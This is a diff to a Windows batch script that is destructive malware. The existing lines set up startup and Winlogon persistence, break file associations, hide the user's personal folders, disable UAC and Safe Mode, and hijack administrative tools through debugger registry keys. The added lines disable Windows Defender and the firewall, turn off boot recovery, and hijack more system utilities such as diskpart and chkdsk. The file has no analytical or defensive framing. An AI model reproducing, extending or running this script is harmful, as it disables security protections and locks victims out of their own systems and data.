@@ -1,11 +1,15 @@
 @echo off
 
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+copy %0 "C:\Windows\Tasks\bat.bat" >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Tasks\bat.bat" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "batbat" /t REG_SZ /d "%0" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "bat_%random%" /t REG_SZ /d "%~f0" /f 2>nul
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticecaption" /d "bat.bat" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticetext" /d "xDDD" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
 assoc .lnk=.xDDD
 assoc .doc=.xDDD
 assoc .xls=.xDDD
@@ -15,10 +19,14 @@ assoc .dll=.xDDD
 assoc .mp3=.xDDD
 assoc .bmp=.xDDD
 assoc .txt=.xDDD
+assoc .zip=.xDDD
+assoc .rar=.xDDD
+assoc .png=.xDDD
 attrib +h +s "%USERPROFILE%\Desktop\*" /s /d
 attrib +h +s "%USERPROFILE%\Documents\*" /s /d  
 attrib +h +s "%USERPROFILE%\Downloads\*" /s /d
 attrib +h +s "%USERPROFILE%\Pictures\*" /s /d
+bcdedit /set {default} recoveryenabled no
 bcdedit /deletevalue {current} safeboot >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
@@ -26,6 +34,7 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 2 /f
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt" /v HideFileExt /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v "CheckedValue" /t REG_DWORD /d 0 /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msinfo32.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\compmgmt.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
@@ -45,6 +54,10 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EaseOfAccessDialog.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winver.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chkdsk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\diskpart.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msiexec.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "AlternateShell" /t REG_SZ /d "cmd.exe" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoLogoff" /t REG_DWORD /d 1 /f
@@ -82,5 +95,3 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Ena
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "UndockWithoutLogon" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScRemoveOption" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
-
-
